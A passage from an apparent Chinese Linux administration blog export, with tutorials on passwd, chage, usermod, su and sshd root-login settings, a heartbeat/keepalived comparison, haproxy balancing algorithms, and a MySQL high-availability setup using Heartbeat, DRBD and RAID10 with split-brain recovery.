&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/home：如果建立一个用户，用户名是”xx”,那么在/home目录下就有一个对应的/home/xx路径，用来存放用户的主目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/lib：lib是库（library）英文缩写。这个目录是用来存放系统动态连接共享库的。几乎所有的应用程序都会用到这个目录下的共享库。因此，千万不要轻易对这个目录进行什么操作，一旦发生问题，系统就不能工作了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/lost+found：在ext2或ext3文件系统中，当系统意外崩溃或机器意外关机，而产生一些文件碎片放在这里。当系统启动的过程中fsck工具会检查这里，并修复已经损坏的文件系统。有时系统发生问题，有很多的文件被移到这个目录中，可能会用手工的方式来修复，或移到文件到原来的位置上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/mnt：这个目录一般是用于存放挂载储存设备的挂载目录的，比如有cdrom等目录。可以参看/etc/fstab的定义。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/media：有些linux的发行版使用这个目录来挂载那些usb接口的移动硬盘（包括U盘）、CD/DVD驱动器等等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/opt：这里主要存放那些可选的程序。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/proc：可以在这个目录下获取系统信息。这些信息是在内存中，由系统自己产生的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/root：Linux超级权限用户root的家目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/sbin：这个目录是用来存放系统管理员的系统管理程序。大多是涉及系统管理的命令的存放，是超级权限用户root的可执行命令存放地，普通用户无权限执行这个目录下的命令，这个目录和/usr/sbin; /usr/X11R6/sbin或/usr/local/sbin目录是相似的，凡是目录sbin中包含的都是root权限才能执行的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/selinux ：对SElinux的一些配置文件目录，SElinux可以让linux更加安全。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/srv 服务启动后，所需访问的数据目录，举个例子来说，www服务启动读取的网页数据就可以放在/srv/www中 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/tmp：临时文件目录，用来存放不同程序执行时产生的临时文件。有时用户运行程序的时候，会产生临时文件。/tmp就用来存放临时文件的。/var/tmp目录和这个目录相似。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/usr：这是linux系统中占用硬盘空间最大的目录。用户的很多应用程序和文件都存放在这个目录下。在这个目录下，可以找到那些不适合放在/bin或/etc目录下的额外的工具 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/usr/local：这里主要存放那些手动安装的软件，即不是通过“新立得”或apt-get安装的软件。它和/usr目录具有相类似的目录结构。让软件包管理器来管理/usr目录，而把自定义的脚本（scripts)放到/usr/local目录下面。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/usr/share ：系统共用的东西存放地，比如 /usr/share/fonts 是字体目录，/usr/share/doc和/usr/share/man帮助文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/var：这个目录的内容是经常变动的，看名字就知道，可以理解为vary的缩写，/var下有/var/log 这是用来存放系统日志的目录。/var/ www目录是定义Apache服务器站点存放目录；/var/lib 用来存放一些库文件，比如MySQL的，以及MySQL数据库的的存放地。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 修改用户密码]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F10.%20Linux%20passwd%20%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[Linux 修改用户密码命令：passwd语法：1passwd [username] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建完账户后，默认是没有设置密码的，虽然没有密码，但该账户同样登录不了系统。只有设置好密码后才能登录系统。为用户创建密码时，为了安全起见，尽量设置复杂一些。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以按照这样的规则来设置密码： 长度大于10个字符； 密码中包含大小写字母数字以及特殊字符 ‘*’ ，‘&amp;’ ，‘%’ 等； 不规则性（不要出现 root 、happy 、love 、linux 、7758520 、111111 等等单词或者数字）； 不要带有自己的名字、公司名字、自己电话、自己生日等。 12345[root@localhost ~]# passwd更改用户 root 的密码 。新的 密码：重新输入新的 密码：passwd： 所有的身份验证令牌已经成功更新。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“passwd” 后面不加 username 则是修改当先账户的密码。如果登录的是 root 账户，后面可以跟普通用户的名字，意思是修改指定账户的密码。 12345[root@localhost ~]# passwd user11更改用户 user11 的密码 。新的 密码：重新输入新的 密码：passwd： 所有的身份验证令牌已经成功更新。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只有 root 用户才可以修改其他账户的密码，普通账户只能修改自己的密码，其他账户的密码是不可以修改的。 passwd 几个比较重要的参数12345678910111213141516[root@localhost beinan]# passwd --helpUsage: passwd [OPTION...] &lt;accountName&gt;-k, --keep-tokens keep non-expired authentication tokens 注：保留即将过期的用户在期满后能仍能使用；-d, --delete delete the password for the named account (root only) 注：删除用户密码，仅能以root权限操作；-l, --lock lock the named account (root only) 注：锁住用户无权更改其密码，仅能通过root权限操作；-u, --unlock unlock the named account (root only) 注：解除锁定；-f, --force force operation 注：强制操作；仅root权限才能操作；-x, --maximum=DAYS maximum password lifetime (root only) 注：两次密码修正的最大天数，后面接数字；仅能root权限操作；-n, --minimum=DAYS minimum password lifetime (root only) 注：两次密码修改的最小天数，后面接数字，仅能root权限操作；-w, --warning=DAYS number of days warning users receives before 注：在距多少天提醒用户修改密码；仅能root权限操作；password expiration (root only)-i, --inactive=DAYS number of days after password expiration when an 注：在密码过期后多少天，用户被禁掉，仅能以root操作；account becomes disabled (root only)-S, --status report password status on the named account (root 注：查询用户的密码状态，仅能root用户操作；only)--stdin read new tokens from stdin (root only) 命令：mkpasswd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个命令经常用来生成密码，省的去想。默认 Linux 是没有这个命令的，需要安装一个包 “expect” ，如果 CentOS 可以上网，也可以使用命令完成安装。 1yum install -y expect &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装好后，输入命令： 12[root@localhost ~]# mkpasswdHXut8oy*8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;生成的随机字符串就可以作为一个密码，只不过这个密码不容易记忆。 锁定和解锁某个账户锁定账户语法1passwd -l username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;让某个账户不能修改密码，可以用 -l 参数来锁定: 123456789[root@localhost ~]# passwd -l beinan 注：锁定用户beinan不能更改密码；Locking password for user beinan.passwd: Success 注：锁定成功；[beinan@localhost ~]# su beinan 注：通过su切换到beinan用户；[beinan@localhost ~]$ passwd 注：beinan来更改密码；Changing password for user beinan.Changing password for beinan(current) UNIX password: 注：输入beinan的当前密码；passwd: Authentication token manipulation error 注：失败，不能更改密码； 解锁账户语法1passwd -u username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：这两个用法只有 root 账户才有资格执行。 清除账户密码语法1passwd -d username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例： 1234567[root@localhost ~]# passwd -d beinan 注：清除beinan用户密码；Removing password for user beinan.passwd: Success 注：清除成功；[root@localhost ~]# passwd -S beinan 注：查询beinan用户密码状态；Empty password. 注：空密码，也就是没有密码；注意： 当我们清除一个用户的密码时，登录时就无需密码；这一点要加以注意 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：当清除一个账户的密码时，登录时就无需密码;这一点要嫁衣注意； 密码时效命令：chage语法1chage [选项] [username] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chage 命令的选项说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-m days： 密码可更改的最小天数。为零时代表任何时候都可以更改密码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-M days： 指定口令有效的最多天数。当该选项指定的天数加上-d选项指定的天数小于当前的日期时，用户在使用该帐号前就必须改变口令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-d days： 指定从1970年1月1日起，口令被改变的天数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-I days： 指定口令过期后，帐号被锁前不活跃的天数。如果值为0，帐号在口令过期后就不会被锁。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-E date： 指定帐号被锁的日期。日期格式YYYY-MM-DD。若不用日期，也可以使用自1970年1月1日后经过的天数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-W days： 指定口令过期前要警告用户的天数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-l： 列出指定用户当前的口令时效信息，以确定帐号何时过期。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：要求用户 user1 两天内不能更改口令，并且口令最长的存活期为30天，并且口令过期前5天通知用户 1chage -m 2 -M 30 -W 5 user1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以使用如下命令查看用户 user1 当前的口令时效信息： 1chage -l user1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;提示： 可以使用 chage [用户名] 进入交互模式修改用户的口令时效。 修改口令实质上就是修改影子口令文件 /etc/shadow 中与口令时效相关的字段值。 chage 修改用户密码有限期限的命令chage 语法格式1chage [-l] [-m 最小天数] [-M 最大天数] [-W 警告] [-i 失效日] [-E 过期日] [-d 最后日] username]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 修改用户属性]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F11.%20Linux%20usermod%20%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%B1%9E%E6%80%A7%2F</url>
    <content type="text"><![CDATA[Linux 修改用户属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;usermod 命令修改系统帐户文件来反映通过命令行指定的变化 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-a|–append&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##把用户追加到某些组中，仅与-G选项一起使用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-c|–comment&#160;&#160;&#160;&#160;&#160;&#160;&#160;##修改/etc/passwd文件第五段comment &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-d|–home&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##修改用户的家目录通常和-m选项一起使用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-e|–expiredate&#160;&#160;&#160;&#160;&#160;&#160;##指定用户帐号禁用的日期，格式YY-MM-DD &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-f|–inactive&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ##用户密码过期多少天后采用就禁用该帐号，0表示密码已过期就禁用帐号，-1表示禁用此功能，默认值是-1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-g|–gid&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ##修改用户的gid，改组一定存在 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-G|–groups&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##把用户追加到某些组中，仅与-a选项一起使用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-l|–login&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##修改用户的登录名称 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-L|–lock&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##锁定用户的密码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-m|–move-home&#160;&#160;&#160;##修改用户的家目录通常和-d选项一起使用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-s|–shell&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##修改用户的shell &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-u|–uid&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##修改用户的uid，该uid必须唯一 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-U|–unlock&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;##解锁用户的密码 示例1.新建用户 test ，密码 test ，另外添加 usertest 组123#useradd test #echo "test" | passwd --stdin test #groupadd usertest 2.把 test 用户加入 usertest 组123#usermod -aG usertest test ##多个组之间用空格隔开 #id test uid=500(test) gid=500(test) groups=500(test),501(usertest) 3.修改 test 用户的家目录123#usermod -md /home/usertest #ls /home usertest 4.修改用户名123#usermod -l urchin(新用户名称) test(原来用户名称) #id urchin uid=500(urchin) gid=500(test) groups=500(test),501(usertest) 5.锁定 urchin 的密码1234567# sed -n '$p' /etc/shadow urchin:$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7::: #usermod -L urchin # sed -n '$p' /etc/shadow urchin:!$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7::: 6.解锁 urchin 的密码1234#usermod -U urchin # sed -n '$p' /etc/shadow urchin:$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \ Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7::: 7.修改用户的 shell12345#sed '$!d' /etc/passwd urchin:x:500:500::/home/usertest:/bin/bash #usermod -s /bin/sh urchin #sed -n '$p' /etc/passwd urchin:x:500:500::/home/usertest:/bin/sh 8.修改用户的 UID123#usermod -u 578 urchin (UID必须唯一) #id urchin uid=578(urchin) gid=500(test) groups=500(test),501(usertest) 9.修改用户的 GID1234#groupadd -g 578 test1 #usermod -g 578 urchin (578组一定要存在) #id urchin uid=578(urchin) gid=578(test1) groups=578(test1),501(usertest) 10.指定帐号过期日期1234567# sed -n '$p' /etc/shadow urchin:$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \ Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7::: # usermod -e 2012-09-11 urchin # sed -n '$p' /etc/shadow urchin:$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \ Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7::15594: 11.指定用户帐号密码过期多少天后，禁用该帐号1234# usermod -f 0 urchin # sed -n '$p' /etc/shadow urchin:$6$1PwPVBn5$o.MIEYONzURQPvn/YqSp69kt2CIASvXhOnjv/t \ Z5m4NN6bJyLjCG7S6vmji/PFDfbyITdm1WmtV45CfHV5vux/:15594:0:99999:7:0:15594: 注意&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;usermod 不允许改变正在线上的使用者帐号名称。当 usermod 用来改变 userID ,必须确认这名 user 没在电脑上执行任何程序 /etc/passwduser_name:x:uid:gid:commnet:home:shell /etc/shadowusername:passwd:lastchg:min:max:warn:inactive:expire:flag–用户名–密码–从1970年1月1日起到上次修改密码所经过的天数–密码再过几天可以被变更(0表示随时可以改变)–密码再过几天必须被变更(99999表示永不过期)–密码过期前几天提醒用户(默认为一周)–密码过期几天后帐号被禁用–从1970年1月1日算起，多少天后账号失效]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[heartbeat和keepalived的区别]]></title>
    <url>%2F2017%2F08%2F10%2FHA%E9%9B%86%E7%BE%A4%2F3.%20heartbeat%E5%92%8Ckeepalived%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[heartbeat和keepalived的区别1）Keepalived使用更简单&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从安装、配置、使用、维护等角度上对比，Keepalived都比Heartbeat要简单得多，尤其是Heartbeat 2.1.4后拆分成3个子项目，安装、配置、使用都比较复杂，尤其是出问题的时候，都不知道具体是哪个子系统出问题了；而Keepalived只有1个安装文件、1个配置文件，配置文件也简单很多； 2）Heartbeat功能更强大&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Heartbeat虽然复杂，但功能更强大，配套工具更全，适合做大型集群管理，而Keepalived主要用于集群倒换，基本没有管理功能； 3）协议不同&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Keepalived使用VRRP协议进行通信和选举，Heartbeat使用心跳进行通信和选举；Heartbeat除了走网络外，还可以通过串口通信，貌似更可靠； 4）使用方式基本类似&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要基于两者设计高可用方案，最终都要根据业务需要写自定义的脚本，Keepalived的脚本没有任何约束，随便怎么写都可以；Heartbeat的脚本有约束，即要支持service start/stop/restart这种方式，而且Heartbeart提供了很多默认脚本，简单的绑定ip，启动apache等操作都已经有了； 使用建议&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优先使用Keepalived，当Keepalived不够用的时候才选择Heartbeat]]></content>
      <tags>
        <tag>HA集群</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 用户切换]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F12.%20Linux%20su%20%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7%2F</url>
    <content type="text"><![CDATA[Linux 用户切换&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令：su &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法 1su [-] username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后面可以跟 ‘-’ 也可以不跟，普通用户 su 不加 username 时就是切换到 root 用户，当然 root 用户同样可以 su 到普通用户。 ‘-’ 这个字符的作用是，加上后会初始化当前用户的各种环境变量。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;做个实验说明加与不加 ‘-’ 的区别： 123456789101112[test@localhost ~]$ pwd/home/test[test@localhost ~]$ su密码：[root@localhost test]# pwd/home/test[root@localhost test]# exitexit[test@localhost ~]$ su -密码：[root@localhost ~]# pwd/root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不加 ‘-’ 切换到 root 账户下时，当前目录没有变化，而加上 ‘-’ 切换到 root 账户后，当前目录为 root 账户的家目录，这跟直接登录 root 账户是一样的。当用 root 切换普通用户时，是不需要输入密码的。这也体现了 root 用户至高无上的权利。 以某一个用户的身份执行某一个命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法 1su -c "command" username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 www 的用户身份执行 /home/www/test.sh 这个脚本 1su -c "/home/www/test.sh" www &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前提是，/home/www/test.sh 这个脚本文件 www 用户有执行权限 如何限制远程登录时，不允许 root 登录，而只允许普通用户登录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改配置文件 /etc/sshd/sshd_config 1vim /etc/sshd/sshd_config &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在文件中查找 “#PermitRoorLogin yes” 这句话，修改为 “PermitRootLogin no” 表示不允许 root 用户远程登录。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/sshd/sshd_config 为 sshd 服务的配置文件，默认虽然在前面加 “#” 注释了这句，“PermitRootLogin yes” 但它默认就是允许 root 账户登录的，所以要想不让 root 登录，修改为 no 就可以了。保存配置文件后，重启 sshd 服务： 1service sshd restart 如何限制远程登录时，只允许 root 使用密钥登录，而不能使用密码登录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开配置文件 /etc/sshd/sshd_config 1vim /etc/sshd/sshd_config &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加上一句： 1PermitRootLogin without-password &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存配置文件后，重启 sshd 服务： 1service sshd restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以了。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[haproxy 常用的8种算法]]></title>
    <url>%2F2017%2F08%2F10%2FHaproxy%2F4.%20haproxy%20%E5%B8%B8%E7%94%A8%E7%9A%848%E7%A7%8D%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[haproxy 常用的8种算法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HAProxy的负载均衡算法现在也越来越多了，具体有如下8种： roundrobin，表示简单的轮询，这个不多说，这个是负载均衡基本都具备的； static-rr，表示根据权重，建议关注； leastconn，表示最少连接者先处理，建议关注； source，表示根据请求源IP，这个跟Nginx的IP_hash机制类似，我们用其作为解决session问题的一种方法 ri，表示根据请求的URI； rl_param，表示根据请求的URl参数’balance url_param’ requires an URL parameter name； hdr(name)，表示根据HTTP请求头来锁定每一次HTTP请求； rdp-cookie(name)，表示根据据cookie(name)来锁定并哈希每一次TCP请求。]]></content>
      <tags>
        <tag>haproxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql-5.5+Heartbeat-3.0.5+DRBD]]></title>
    <url>%2F2017%2F08%2F10%2FHA%E9%9B%86%E7%BE%A4%2F5.%20Mysql-5.5%2BHeartbeat-3.0.5%2BDRBD%2F</url>
    <content type="text"><![CDATA[Mysql-5.5+Heartbeat-3.0.5+DRBD&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;环境： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CentOS 6.5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL_Master &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;eth0 192.168.1.10 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;eth1 192.168.2.10 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MySQL_Slave &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;eth0 192.168.1.11 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;eth1 192.168.2.11 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HA 192.168.1.254 创建RAID1+0组合[存储数据 四块硬盘]1.创建两块RAID1 [4块硬盘、MySQL主从节点执行]123456789101112131415161718[root@master ~]# mdadm --create /dev/md0 --level=raid1 --raid-devices=2 /dev/sdb1 /dev/sdc1mdadm: Note: this array has metadata at the start and may not be suitable as a boot device. If you plan to store '/boot' on this device please ensure that your boot-loader understands md/v1.x metadata, or use --metadata=0.90Continue creating array? ymdadm: Defaulting to version 1.2 metadatamdadm: array /dev/md0 started.[root@master ~]# mdadm --create /dev/md1 --level=raid1 --raid-devices=2 /dev/sdb1 /dev/sdc1mdadm: Note: this array has metadata at the start and may not be suitable as a boot device. If you plan to store '/boot' on this device please ensure that your boot-loader understands md/v1.x metadata, or use --metadata=0.90Continue creating array? ymdadm: Defaulting to version 1.2 metadatamdadm: array /dev/md1 started. 2.利用两个 RAID1 创建 RAID0123[root@CentOS ~]# mdadm --create /dev/md2 --level=raid0 --raid-devices=2 /dev/md0 /dev/md1mdadm: Defaulting to version 1.2 metadatamdadm: array /dev/md2 started. 3.将raid信息写入配置文件12345678[root@master ~]# mdadm --detail --scan &gt; /etc/mdadm.conf [root@master ~]# vi /etc/mdadm.confARRAY /dev/md0 metadata=1.2 name=CentOS:0 UUID=b4c4c7b4:0f9f6e60:7eb24578:29682c96devices /dev/sdb1 /dev/sdc1ARRAY /dev/md1 metadata=1.2 name=CentOS:1 UUID=f5afcda6:86847677:c752fcdd:fbb91e00devices /dev/sdd1 /dev/sde1ARRAY /dev/md2 metadata=1.2 name=CentOS:2 UUID=00f120ec:bab2f3fe:80d88cb9:3ee4b76bdevices /dev/md0 /dev/md1 安装DRBD1.解压并安装DRBD1234567891011[root@master Linux]# yum -y install gcc kernel-devel kernel-headers flex perl[root@master Linux]# http://oss.linbit.com/drbd/8.4/drbd-8.4.4.tar.gz[root@master Linux]# tar fzvx drbd-8.4.4.tar.gz[root@master Linux]# cd drbd-8.4.4[root@master drbd-8.4.4]# ./configure --prefix=/usr/local/drbd-8.4 --with-km[root@master drbd-8.4.4]# make KDIR=/usr/src/kernels/2.6.32-358.el6.x86_64/[root@master drbd-8.4.4]# make install[root@master drbd-8.4.4# mkdir -p /usr/local/drbd-8.4/var/run/drbd[root@master drbd-8.4.4]# cp /usr/local/drbd-8.4/etc/rc.d/init.d/drbd /etc/init.d/[root@master drbd-8.4.4]# chkconfig --add drbd[root@master drbd-8.4.4]# chkconfig drbd on 2.安装drbd模块12345[root@master drbd-8.4.4]# cd drbd[root@master drbd]# make clean[root@master drbd]# make KDIR=/usr/src/kernels/2.6.32-358.el6.x86_64/[root@master drbd]# cp drbd.ko /lib/modules/2.6.32-358.el6.x86_64/kernel/lib/[root@master drbd]# depmod 3.配置global_common.conf12345678910111213141516171819202122232425262728293031323334[root@master drbd]# cd /usr/local/drbd-8.4/etc/drbd.d/[root@master drbd.d]# cp global_common.conf global_common.conf.bak[root@master drbd.d]# vi global_common.confglobal &#123;usage-count no;&#125;common &#123;handlers &#123;pri-on-incon-degr "/usr/lib/drbd/notify-pri-on-incon-degr.sh; /usr/lib/drbd/notify-emergency-reboot.sh; echo b &gt; /proc/sysrq-trigger ; reboot -f";pri-lost-after-sb "/usr/lib/drbd/notify-pri-lost-after-sb.sh; /usr/lib/drbd/notify-emergency-reboot.sh; echo b &gt; /proc/sysrq-trigger ; reboot -f";local-io-error "/usr/lib/drbd/notify-io-error.sh; /usr/lib/drbd/notify-emergency-shutdown.sh; echo o &gt; /proc/sysrq-trigger ; halt -f";fence-peer "/usr/lib/drbd/crm-fence-peer.sh";split-brain "/usr/lib/drbd/notify-split-brain.sh root";out-of-sync "/usr/lib/drbd/notify-out-of-sync.sh root";&#125;startup &#123;wfc-timeout 30;degr-wfc-timeout 30;outdated-wfc-timeout 30;&#125;disk &#123;#磁盘读写速度与同步速率的30%resync-rate 30M;on-io-error detach;fencing resource-only;&#125;net &#123;protocol C;cram-hmac-alg sha1;shared-secret "mysql-ha";csums-alg sha1;verify-alg crc32c;&#125;&#125; 4.创建r0资源123456789101112131415[root@master drbd.d]# vi r0.resresource r0&#123; on master&#123; device /dev/drbd0; #逻辑设备的路径 disk /dev/md2; #物理设备 address 192.168.2.10:7788; meta-disk internal; &#125; on slave&#123; device /dev/drbd0; disk /dev/md2; address 192.168.2.11:7788; meta-disk internal; &#125;&#125; 5.建立 drbd resource123[root@master drbd.d]# modprobe drbd[root@master drbd.d]# drbdadm create-md r0[root@master drbd.d]# drbdadm up r0 6.设置Primary [在master节点操作]1[root@master drbd.d]# drbdadm primary --force r0 7.创建DRBD文件系统 [在Mysql主节点的master上执行]12[root@master drbd.d]# mkfs.ext4 /dev/drbd0[root@master drbd.d]# mount /dev/drbd0 /raid10/ 8.DRBD同步测试首先，在主服务器上先将设备卸载，同时将主服务器降为备用服务器：1234[root@master drbd]# mkdir -p /raid10/mysql/data[root@master drbd]# cd /[root@master /]# umount /dev/drbd0[root@master /]# drbdadm secondary r0 然后，登录备用服务器，将备用服务器升为主服务器，同时挂载drbd0设备到 /raid10目录：123456[root@slave drbd]# drbdadm up r0[root@slave drbd]# drbdadm primary r0[root@slave drbd]# mount /dev/drbd0 /raid10/[root@slave drbd]# cd /raid10/[root@slave raid10]# lslost+found mysql 使用中出现脑裂以及解决办法1234[root@slave ~]# cat /proc/drbdversion: 8.4.4 (api:1/proto:86-101)GIT-hash: 599f286440bd633d15d5ff985204aff4bccffadd build by root@slave, 2013-12-03 09:50:30 0: cs:StandAlone ro:Primary/Unknown ds:UpToDate/Outdated r-----ns:0 nr:0 dw:2 dr:1684 al:1 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:4 查看日志123456789101112[root@slave /]# tail -f /var/log/messagesDec 3 11:06:05 slave kernel: block drbd0: helper command: /sbin/drbdadm split-brain minor-0 exit code127 (0x7f00)Dec 3 11:06:05 slave kernel: drbd r0: conn( WFReportParams -&gt; Disconnecting )Dec 3 11:06:05 slave kernel: drbd r0: error receiving ReportState, e: -5 l: 0!Dec 3 11:06:05 slave kernel: drbd r0: asender terminatedDec 3 11:06:05 slave kernel: drbd r0: Terminating drbd_a_r0Dec 3 11:06:05 slave kernel: drbd r0: Connection closedDec 3 11:06:05 slave kernel: drbd r0: conn( Disconnecting -&gt; StandAlone )Dec 3 11:06:05 slave kernel: drbd r0: receiver terminatedDec 3 11:06:05 slave kernel: drbd r0: Terminating drbd_r_r0Dec 3 11:06:41 slave kernel: block drbd0: role( Secondary -&gt; Primary ) 解决方法：1.需要将现在的master角色修改为secondary123[root@master ~]# drbdadm secondary r0#该命令告诉slave，secondary上的数据不正确，以primary上的数据为准。[root@master ~]# drbdadm -- --discard-my-data connect r0 